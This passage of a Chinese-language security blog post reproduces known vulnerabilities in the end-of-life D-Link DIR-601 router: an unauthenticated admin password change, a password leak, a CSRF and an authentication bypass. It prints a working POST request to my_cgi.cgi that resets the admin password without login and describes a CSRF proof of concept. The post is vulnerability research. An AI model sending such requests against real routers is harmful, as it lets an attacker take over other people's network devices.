+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/7771105a3059461c2f1bda87870c.png" srcset="/img/loading.gif" lazyload alt="5307771105a3059461c2f1bda87870c"></p>
+<h4 id="CVE-2018-10641"><a href="#CVE-2018-10641" class="headerlink" title="CVE-2018-10641"></a><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2018-10641">CVE-2018-10641</a></h4><p>D-Link DIR-601 A1 1.02NA 设备不需要旧密码即可更改密码，密码以明文形式进行。</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">拥有网络访问权限，尽管未经身份验证，攻击者可以确定用户名和密码。通过代理或 MITM 访问配置主机访问的 <span class="hljs-built_in">URL</span>，用户名和密码以 BASE64 编码传递以进行登录，并以明文形式传递以重置密码。注意：重置管理员密码不需要当前密码。<br></code></pre></td></tr></table></figure>
+
+<p>这里使用的是版本是 2.02NA 但该漏洞仍然存在。</p>
+<p>web页面修改密码并抓包</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728152148638.png" srcset="/img/loading.gif" lazyload alt="image-20240728152148638"></p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728152516906.png" srcset="/img/loading.gif" lazyload alt="image-20240728152516906"></p>
+<p>将admin_user_pwd修改，发包并修改成功。后进入web页面用密码admin3正常<strong>登录成功</strong></p>
+<p>观察这个包</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/my_cgi.cgi?0.17187552205421389</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-apache"><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.0.1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">285</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Linux x86_64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">127.0.0.0</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">127.0.0.0</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>: */*</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">192.168.0.1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">192.168.0.1</span>/tools_admin.htm</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Connection</span>: close</span><br><span class="language-apache"></span><br><span class="language-apache"></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">request</span>=update_entry&amp;table_name=admin_user&amp;rowid=<span class="hljs-number">0</span>&amp;admin_user_pwd=<span class="hljs-number">123456</span>&amp;request=update_entry&amp;table_name=system&amp;rowid=<span class="hljs-number">0</span>&amp;gateway_name=DIR-<span class="hljs-number">601</span>&amp;request=update_entry&amp;table_name=graph_auth&amp;rowid=<span class="hljs-number">0</span>&amp;graph_auth_enable=<span class="hljs-number">0</span>&amp;request=update_entry&amp;table_name=remote_management&amp;rowid=<span class="hljs-number">0</span>&amp;remote_enable=<span class="hljs-number">0</span></span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>这里除了一个可以随意变换的时间戳之外，没有任何对当前用户是否登录的校验，并且密码居然使用明文传输。</p>
+<p>因此攻击者可以在不登陆的情况随意修改路由器密码。</p>
+<h4 id="CVE-2018-12710"><a href="#CVE-2018-12710" class="headerlink" title="CVE-2018-12710"></a><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2018-12710">CVE-2018-12710</a></h4><p>An issue was discovered on D-Link DIR-601 2.02NA devices. Being local to the network and having only “User” account (which is a low privilege account) access, an attacker can intercept the response from a POST request to obtain “Admin” rights due to the admin password being displayed in XML.</p>
+<p>和CVE-2018-10641一样</p>
+<h4 id="CVE-2019-16326"><a href="#CVE-2019-16326" class="headerlink" title="CVE-2019-16326"></a><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2019-16326">CVE-2019-16326</a></h4><p>D-Link DIR-601 B1 2.00NA devices have CSRF because no anti-CSRF token is implemented. A remote attacker could exploit this in conjunction with CVE-2019-16327 to enable remote router management and device compromise. NOTE: this is an end-of-life product.</p>
+<p>CSFRF漏洞</p>
+<p>这个洞相第二个未验证修改密码的进一步应用</p>
+<p>首先通过信息泄露获取admin的密码登录进入</p>
+<p>然后修改dns和admin密码，抓包</p>
+<p>修改密码的包：</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728160548312.png" srcset="/img/loading.gif" lazyload alt="image-20240728160548312"></p>
+<p>修改dns的包：</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728160239990.png" srcset="/img/loading.gif" lazyload alt="image-20240728160239990"></p>
+<p>把两个包的参数一结合，发包，您猜怎么着</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728160907600.png" srcset="/img/loading.gif" lazyload alt="image-20240728160907600"></p>
+<p>修改成功</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728160930147.png" srcset="/img/loading.gif" lazyload alt="image-20240728160930147"></p>
+<p>burp生成poc</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728161051539.png" srcset="/img/loading.gif" lazyload alt="image-20240728161051539"></p>
+<p>模拟攻击成功</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728161436266.png" srcset="/img/loading.gif" lazyload alt="image-20240728161436266"></p>
+<p>这个csrf属实是。。。</p>
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="CVE-2019-16327"><a href="#CVE-2019-16327" class="headerlink" title="CVE-2019-16327"></a><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2019-16327">CVE-2019-16327</a></h4><p>D-Link DIR-601 B1 2.00NA devices are vulnerable to authentication bypass. They do not check for authentication at the server side and rely on client-side validation, which is bypassable. NOTE: this is an end-of-life product.</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728162007173.png" srcset="/img/loading.gif" lazyload alt="image-20240728162007173"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>dir-601固件分析</div>
+      <div>http://groundctl2majortom.github.io/2024/08/10/dir-601固件分析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>GroundCtl2MajorTom</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/08/14/upnp%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="upnp协议学习及漏洞复现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">upnp协议学习及漏洞复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/07/DWR-932B%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="DWR-932B后门漏洞分析">
+                        <span class="hidden-mobile">DWR-932B后门漏洞分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
